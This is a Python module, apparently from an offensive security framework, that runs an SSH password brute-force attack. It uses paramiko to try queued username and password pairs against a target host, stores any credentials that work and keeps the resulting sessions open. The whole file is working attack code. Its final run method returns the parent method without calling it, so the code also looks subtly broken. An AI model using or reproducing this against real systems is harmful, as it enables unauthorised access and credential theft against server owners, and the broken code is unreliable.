from jframework.modules.login._bruteforce import _Bruteforce
import sys, time
hasParamiko = True
try:
    import paramiko
except:
    print("✕ It's required install paramiko module to run sshbruteforce")
    hasParamiko = False


class Sshbruteforce(_Bruteforce):

    def __init__(self):
        super(Sshbruteforce, self).__init__()
        self.single_port = 22

    def worker(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        while(not self.tasks_queue.empty()):
            task = self.tasks_queue.get()
            if task is None:
                break
            try:
                client.connect(hostname=self.host, port=self.single_port, username=task["user"], 
                                password=task["password"], banner_timeout=2, timeout=2)
                self.print_result(task["user"], task["password"], error=False)
                self.add_credential(task["user"], task["password"], "ssh")
                self.add_session(client, task["user"], "ssh")
            except Exception as e:
                if "is not subscriptable" in str(e):
                    print("No SSH service")
                    break
                if (self.verb):
                    self.print_result(task["user"], task["password"], error=True)
                try:
                    client.close()
                except:
                    pass
            self.tasks_queue.task_done()

    def run(self):
        if (not hasParamiko):
            print("✕  It's required install paramiko")
            return

        return super(Sshbruteforce, self).run